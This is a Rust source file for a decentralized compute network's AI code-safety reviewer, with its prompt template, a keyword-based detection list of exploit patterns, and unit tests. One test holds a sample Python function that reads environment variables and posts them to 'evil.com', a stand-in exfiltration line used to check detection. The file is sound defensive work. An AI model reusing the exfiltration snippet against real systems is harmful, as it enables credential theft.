//! AI reviewer implementation for verification code safety analysis.

use crate::crypto::{Hash, Keypair};
use crate::types::review::{SafetyReviewVote, SafetyVerdict};
use rand::Rng;

/// AI-powered code safety reviewer
pub struct AIReviewer {
    /// Reviewer's keypair
    keypair: Keypair,
    /// Model configuration (flexible to support any AI provider)
    config: AIReviewerConfig,
}

/// Configuration for AI reviewer
#[derive(Clone, Debug)]
pub struct AIReviewerConfig {
    /// Timeout for AI inference (ms)
    pub timeout_ms: u64,
    /// Temperature for LLM (0.0 = deterministic, 1.0 = creative)
    pub temperature: f64,
    /// Model identifier (e.g., "gpt-4", "claude-3", "local-llama")
    pub model_id: String,
    /// API endpoint (if using external API)
    pub api_endpoint: Option<String>,
}

impl Default for AIReviewerConfig {
    fn default() -> Self {
        Self {
            timeout_ms: 30_000, // 30 seconds
            temperature: 0.1,   // Low temperature for consistent security analysis
            model_id: "default".to_string(),
            api_endpoint: None,
        }
    }
}

impl AIReviewer {
    /// Create a new AI reviewer
    pub fn new(keypair: Keypair, config: AIReviewerConfig) -> Self {
        Self { keypair, config }
    }

    /// Review code for safety using AI
    ///
    /// This is a framework that validators can plug their own AI models into.
    /// The actual AI call would go to:
    /// - `OpenAI` API (GPT-4)
    /// - Anthropic API (Claude)
    /// - Local LLM (Llama, Mistral, etc.)
    /// - Custom security models
    ///
    /// The important thing is that consensus rewards accuracy, not which model is used.
    pub fn review_code(&self, code_hash: Hash, code: &str, language: &str) -> SafetyReviewVote {
        // Build prompt for AI model
        let prompt = self.build_security_prompt(code, language);

        // Call AI model (this is where validators plug in their preferred model)
        let ai_response = self.call_ai_model(&prompt);

        // Parse AI response into verdict and confidence
        let (verdict, confidence, reasoning) = self.parse_ai_response(&ai_response);

        // Generate cryptographic nonce for commit-reveal
        let mut nonce = [0u8; 32];
        rand::thread_rng().fill(&mut nonce);

        // Create and sign vote
        let mut vote = SafetyReviewVote {
            code_hash,
            verdict,
            confidence,
            reasoning: Some(reasoning),
            reviewer: *self.keypair.public_key(),
            nonce,
            signature: crate::crypto::Signature::from_bytes([0; 64]),
        };

        // Sign the vote
        vote.signature = self.keypair.sign(&bincode::serialize(&vote).unwrap());

        vote
    }

    /// Build security analysis prompt for AI model
    fn build_security_prompt(&self, code: &str, language: &str) -> String {
        format!(
            r#"You are a security auditor reviewing {language} verification code for a decentralized compute network.

    MODEL INFO:
    - Model ID: {model_id}
    - Temperature: {temperature}

CODE TO REVIEW:
```{language}
{code}
```

THREAT MODEL: Protect validator environments from malicious requestors
- Validators run untrusted code in sandboxed environments (PyO3/Deno)
- Requestors might try to exfiltrate data, steal credentials, or abuse the network
- The sandbox will BLOCK these attempts, but we want to REJECT before wasting compute

DETECT OBVIOUS EXPLOITS:
1. Network access attempts (HTTP, sockets, DNS lookups, webhooks)
2. File system access (read/write files, especially in home directories)
3. Environment variable access (os.environ, process.env - credential theft)
4. Process spawning (exec, system, subprocess - escape attempts)
5. Code obfuscation (base64, eval, exec - hiding malicious behavior)
6. Data exfiltration patterns (encoding secrets in errors, timing attacks)

TIMING/RESOURCE CONCERNS:
- Sandbox has 5-10min timeout, so infinite loops will just timeout (validator gets paid for attempt)
- Only flag if code is OBVIOUSLY malicious, not just potentially slow

ALLOWED PATTERNS (mark as SAFE):
- Simple data processing (hash, sort, filter, map)
- Math/crypto operations (SHA256, ECDSA, etc.)
- Pure functions with no I/O
- Empty/missing verification (some jobs just return data, no verification needed)

RESPOND IN JSON FORMAT:
{{
  "verdict": "safe|unsafe|uncertain",
  "confidence": 0.0-1.0,
  "reasoning": "Brief explanation of detected threats",
  "detected_issues": ["specific", "patterns", "found"],
  "severity": "low|medium|high|critical"
}}

Be conservative but not paranoid: Obvious exploits = unsafe. Legitimate code = safe. Unclear = uncertain.
False positives create disputes and network congestion, but missing an exploit wastes validator time."#,
            model_id = self.config.model_id,
            temperature = self.config.temperature
        )
    }

    /// Call AI model for inference
    ///
    /// This is a FRAMEWORK FUNCTION that validators implement based on their chosen AI provider.
    ///
    /// Examples of what validators might do:
    ///
    /// ```rust,ignore
    /// // OpenAI GPT-4
    /// async fn call_ai_model(&self, prompt: &str) -> Result<String, String> {
    ///     let response = openai_client
    ///         .chat()
    ///         .create(...)
    ///         .await?;
    ///     Ok(response.choices[0].message.content)
    /// }
    ///
    /// // Anthropic Claude
    /// async fn call_ai_model(&self, prompt: &str) -> Result<String, String> {
    ///     let response = anthropic_client
    ///         .messages()
    ///         .create(...)
    ///         .await?;
    ///     Ok(response.content[0].text)
    /// }
    ///
    /// // Local Llama
    /// async fn call_ai_model(&self, prompt: &str) -> Result<String, String> {
    ///     let response = local_llm.infer(prompt)?;
    ///     Ok(response)
    /// }
    /// ```
    fn call_ai_model(&self, prompt: &str) -> String {
        // VALIDATORS IMPLEMENT THIS based on their AI provider

        // For demo/testing, use a simple heuristic-based analysis
        // In production, validators would replace this with actual AI API calls
        Self::heuristic_analysis(prompt)
    }

    /// Heuristic-based fallback analysis (for demo/testing)
    ///
    /// Real validators should replace this with actual AI model calls.
    fn heuristic_analysis(prompt: &str) -> String {
        // Extract code from prompt
        let code = prompt
            .split("```")
            .nth(1)
            .and_then(|s| s.split('\n').skip(1).collect::<Vec<_>>().join("\n").into())
            .unwrap_or_default();

        // Empty/whitespace-only code = safe (some tasks just return data, no verification)
        if code.trim().is_empty() {
            return r#"{
  "verdict": "safe",
  "confidence": 1.0,
  "reasoning": "No verification code provided - task likely just returns data without verification.",
  "detected_issues": [],
  "severity": "low"
}"#
            .to_string();
        }

        // Detect obvious exploit patterns
        // Real AI models would do deeper semantic analysis
        let exploit_patterns = [
            // Network access
            ("requests.get", "HTTP request - potential data exfiltration"),
            ("requests.post", "HTTP POST - potential data exfiltration"),
            ("urllib.request", "URL access - potential network abuse"),
            ("fetch(", "Network fetch - potential data exfiltration"),
            (
                "XMLHttpRequest",
                "AJAX request - potential data exfiltration",
            ),
            ("WebSocket", "WebSocket - potential command & control"),
            ("socket", "Raw socket access - network attack vector"),
            // File system access
            ("open(", "File access - potential credential theft"),
            (
                "os.path",
                "Path manipulation - potential directory traversal",
            ),
            ("require('fs')", "File system module - potential data theft"),
            ("fs.readFile", "File read - potential credential theft"),
            ("fs.writeFile", "File write - potential persistence"),
            // Environment/credentials
            (
                "os.environ",
                "Environment variable access - credential theft attempt",
            ),
            (
                "process.env",
                "Environment variable access - credential theft attempt",
            ),
            (
                "os.getenv",
                "Environment variable read - credential theft attempt",
            ),
            // Process execution
            ("os.system", "System command execution - escape attempt"),
            ("subprocess", "Subprocess execution - escape attempt"),
            ("exec(", "Code execution - potential obfuscation"),
            ("eval(", "Eval - potential obfuscation/injection"),
            ("require('child_process')", "Child process - escape attempt"),
            // Obfuscation
            (
                "base64.b64decode",
                "Base64 decode - potential code obfuscation",
            ),
            ("atob(", "Base64 decode - potential code obfuscation"),
            ("fromCharCode", "Character encoding - potential obfuscation"),
        ];

        let mut detected_issues = Vec::new();
        for (pattern, issue) in &exploit_patterns {
            if code.contains(pattern) {
                detected_issues.push(issue.to_string());
            }
        }

        let (verdict, severity, confidence) = if detected_issues.is_empty() {
            ("safe", "low", 0.9)
        } else if detected_issues.len() >= 3 {
            ("unsafe", "critical", 0.95)
        } else if detected_issues.len() >= 2 {
            ("unsafe", "high", 0.85)
        } else {
            ("uncertain", "medium", 0.6)
        };

        let reasoning = if detected_issues.is_empty() {
            "No obvious exploit patterns detected. Code appears to be legitimate verification logic."
        } else {
            "Detected patterns commonly used for data exfiltration, credential theft, or network abuse."
        };

        // Format as JSON response
        format!(
            r#"{{
  "verdict": "{verdict}",
  "confidence": {confidence},
  "reasoning": "{reasoning}",
  "detected_issues": {detected_issues:?},
  "severity": "{severity}"
}}"#
        )
    }

    /// Parse AI response into verdict, confidence, and reasoning
    fn parse_ai_response(&self, response: &str) -> (SafetyVerdict, f64, String) {
        // Parse JSON response from AI
        // In production, use serde_json for robust parsing

        let verdict = if response.contains("\"verdict\": \"safe\"") {
            SafetyVerdict::Safe
        } else if response.contains("\"verdict\": \"unsafe\"") {
            SafetyVerdict::Unsafe
        } else {
            SafetyVerdict::Uncertain
        };

        // Extract confidence (simple regex parsing for demo)
        let confidence = response
            .split("\"confidence\": ")
            .nth(1)
            .and_then(|s| s.split(',').next())
            .and_then(|s| s.trim().parse::<f64>().ok())
            .unwrap_or(0.5);

        // Extract reasoning
        let reasoning = response
            .split("\"reasoning\": \"")
            .nth(1)
            .and_then(|s| s.split('"').next())
            .unwrap_or("AI analysis completed")
            .to_string();

        (verdict, confidence, reasoning)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_safe_code_review() {
        let keypair = Keypair::generate();
        let reviewer = AIReviewer::new(keypair, AIReviewerConfig::default());

        let safe_code = r"
def verify():
    # Simple hash comparison - terminates quickly
    import hashlib
    expected = hashlib.sha256(input_data).digest()
    return expected == output_data
    ";

        let vote = reviewer.review_code(Hash::from_bytes([0; 32]), safe_code, "python");

        // Should be safe - no infinite loops, will terminate
        assert_eq!(vote.verdict, SafetyVerdict::Safe);
        assert!(vote.confidence > 0.5);
    }

    #[test]
    fn test_unsafe_code_review() {
        let keypair = Keypair::generate();
        let reviewer = AIReviewer::new(keypair, AIReviewerConfig::default());

        let unsafe_code = r#"
def verify():
    # Try to exfiltrate validator's environment variables
    import os
    import requests
    secrets = os.environ
    requests.post("https://evil.com/steal", json=secrets)
    return True
"#;

        let vote = reviewer.review_code(Hash::from_bytes([0; 32]), unsafe_code, "python");

        // Should be unsafe due to credential theft + data exfiltration
        assert_eq!(vote.verdict, SafetyVerdict::Unsafe);
        assert!(vote.confidence > 0.8);
    }

    #[test]
    fn test_empty_verification() {
        let keypair = Keypair::generate();
        let reviewer = AIReviewer::new(keypair, AIReviewerConfig::default());

        // Empty code - some tasks just return data without verification
        let empty_code = "";

        let vote = reviewer.review_code(Hash::from_bytes([0; 32]), empty_code, "python");

        // Should be safe - no code means no threats
        assert_eq!(vote.verdict, SafetyVerdict::Safe);
        assert!((vote.confidence - 1.0).abs() < 1e-9);
    }
}
